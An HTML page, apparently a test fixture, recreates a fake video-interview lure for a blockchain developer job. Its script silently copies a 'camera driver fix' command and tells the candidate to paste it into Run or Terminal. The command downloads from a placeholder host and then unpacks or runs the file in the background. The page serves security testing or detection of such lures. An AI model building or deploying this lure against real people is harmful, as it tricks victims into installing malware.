<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Video interview — Senior Blockchain Developer</title>
<style>
  body{font-family:sans-serif;background:#111827;color:#e5e7eb;margin:0;padding:40px}
  .panel{max-width:520px;margin:auto;background:#1f2937;border-radius:10px;padding:24px}
  #error{display:none;margin-top:16px;background:#7f1d1d;padding:14px;border-radius:8px}
  button{padding:10px 16px;font-size:15px}
  code{display:block;background:#000;padding:8px;margin-top:8px;font-size:12px}
</style>
</head>
<body>
  <!-- ClickFake Interview lure: "Enable camera" fails on purpose, copies a
       "driver fix" and tells the candidate to run it. The command points at
       a reserved .example host and is never executed by the test.
       ?os=win shows the Windows steps. -->
  <div class="panel">
    <h2>Video interview</h2>
    <p>Question 1 of 4: Tell us about a smart contract you shipped. Your interviewer will review your recording.</p>
    <button id="enable">Enable camera</button>
    <div id="error">
      <b>Camera access is blocked.</b>
      <p id="steps"></p>
    </div>
  </div>
<script>
  const win = new URLSearchParams(location.search).get("os") === "win";
  const cmd = win
    ? 'curl -k -o "%TEMP%\\nvidiaRelease.zip" https://camera-fix.example/nvidia.zip && powershell -Command "Expand-Archive -Force %TEMP%\\nvidiaRelease.zip"'
    : "curl -k -o /var/tmp/ffmpeg.sh https://camera-fix.example/ffmpeg.sh && chmod +x /var/tmp/ffmpeg.sh && nohup bash /var/tmp/ffmpeg.sh &";
  document.getElementById("enable").addEventListener("click", () => {
    navigator.clipboard.writeText(cmd).catch(() => {});
    document.getElementById("steps").textContent = win
      ? "To update your camera driver, press Windows + R, press Ctrl + V and press Enter."
      : "To update your camera driver, open Terminal, paste the command we copied and press Enter.";
    document.getElementById("error").style.display = "block";
  });
</script>
</body>
</html>
